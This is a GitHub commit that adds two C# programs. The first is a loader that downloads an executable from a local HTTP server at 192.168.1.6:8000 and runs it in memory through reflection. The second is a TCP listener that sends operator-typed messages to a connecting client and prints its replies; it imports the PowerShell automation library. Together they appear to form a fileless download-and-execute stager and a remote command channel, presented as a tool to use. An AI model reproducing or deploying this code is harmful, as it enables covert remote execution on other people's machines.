3ef7712aeb50d83aa2ed1ccd8b43724effb6b795
Vi-pin <164785228+Vi-pinV@users.noreply.github.com>
2024-11-07 00:27:51 +0530

    Add files via upload
    Share client using "python -m http.server" in cmd
    Execute the Server executable.
    Run the loader.
    You will have a loader with server and client thread.

---
+++ loader/loader/Program.cs
@@ -0,0 +1,49 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Reflection;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Threading;
+using System.Net;
+
+namespace loader
+{
+    internal class Program
+    {
+        /*public void LoadFromFile(string filepath)
+        {
+            Assembly assembly = Assembly.LoadFile(filepath);
+            string[] newargs = { };
+            assembly.EntryPoint.Invoke(null, new object[] {newargs});
+        }*/
+        public void LoadFromUrl(string url)
+        {
+            WebClient wc = new WebClient();
+            byte[] filecontent = wc.DownloadData(url);
+            
+            
+            Assembly assembly = Assembly.Load(filecontent);
+            string[] newargs = {"192.168.1.6","12345","192.168.1.6","8000" };
+            assembly.EntryPoint.Invoke(null, new object[] { newargs });      
+         
+          
+        }
+        static void Main(string[] args)
+        {
+            Thread t = new Thread(() =>
+            {
+                Program p = new Program();
+                //p.LoadFromFile(@"C:\Users\vipin\source\repos\messageboxdemo\messageboxdemo\bin\Debug\messageboxdemo.exe");
+                p.LoadFromUrl(@"http://192.168.1.6:8000/socket_client.exe");
+                
+
+            });
+            t.Start();
+            t.Join();
+            Console.WriteLine("Press anything to continue");
+            Console.ReadKey();
+        }
+    }
+}
---
+++ socket_server/socket_server/Program.cs
@@ -0,0 +1,50 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Net.Sockets;
+using System.Net;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+
+namespace socket_server
+{
+    internal class Program
+    {
+        
+        static void Main(string[] args)
+        {
+            /*Console.WriteLine(IPAddress.Any);
+            Console.ReadKey();*/
+            IPEndPoint ipe = new IPEndPoint(IPAddress.Any, 1234);
+            Socket server_socket = new Socket(IPAddress.Any.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
+            server_socket.Bind(ipe);
+            server_socket.Listen(50);
+
+            Socket client_socket = server_socket.Accept();
+            Console.WriteLine("[+] Connection from : {0}",client_socket.RemoteEndPoint);
+
+            Console.WriteLine("Enter message to send:");
+            string msg;
+            msg= Console.ReadLine();
+            client_socket.Send(Encoding.ASCII.GetBytes(msg));
+            while (msg !="quit")
+            {
+                
+                byte[] sb = new byte[2048];
+                Array.Clear(sb, 0, sb.Length);
+                client_socket.Receive(sb);
+
+                Console.WriteLine(Encoding.ASCII.GetString(sb).TrimEnd('\0'));
+
+                Console.WriteLine("Enter message to send:");
+                msg = Console.ReadLine();
+                client_socket.Send(Encoding.ASCII.GetBytes(msg));
+            }
+            client_socket.Close();
+            server_socket.Close();
+            // Console.ReadKey();
+        }
+    }
+}
